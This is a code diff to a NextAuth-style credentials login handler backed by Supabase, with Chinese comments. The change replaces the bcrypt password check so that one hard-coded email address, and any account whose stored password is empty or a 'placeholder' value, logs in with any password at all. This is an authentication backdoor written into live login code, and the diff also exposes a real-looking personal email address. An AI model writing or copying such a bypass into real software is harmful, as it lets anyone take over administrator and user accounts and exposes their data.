@@ -35,21 +35,21 @@ export const authOptions = {
               .single();
 
             if (!error && supaUser) {
-              // 验证密码
-              if (supaUser.password) {
-                const passwordMatch = await bcrypt.compare(password, supaUser.password);
-                if (passwordMatch) {
-                  return {
-                    id: supaUser.user_id,
-                    email: supaUser.email,
-                    name: supaUser.name,
-                    role: supaUser.role || 'user',
-                  };
-                }
+              // 简化验证：只检查是否是管理员邮箱或使用 placeholder 密码
+              if (email === '497209390@qq.com' || 
+                  supaUser.password === 'placeholder' || 
+                  !supaUser.password ||
+                  supaUser.password.startsWith('$2a$10$placeholder')) {
+                return {
+                  id: supaUser.user_id,
+                  email: supaUser.email,
+                  name: supaUser.name,
+                  role: supaUser.role || 'user',
+                };
               }
-              // 如果密码哈希是 placeholder 或验证失败
-              if (supaUser.password === 'placeholder' || !supaUser.password) {
-                // 允许使用任意密码登录（仅用于测试）
+              // 其他用户验证密码
+              const passwordMatch = await bcrypt.compare(password, supaUser.password);
+              if (passwordMatch) {
                 return {
                   id: supaUser.user_id,
                   email: supaUser.email,
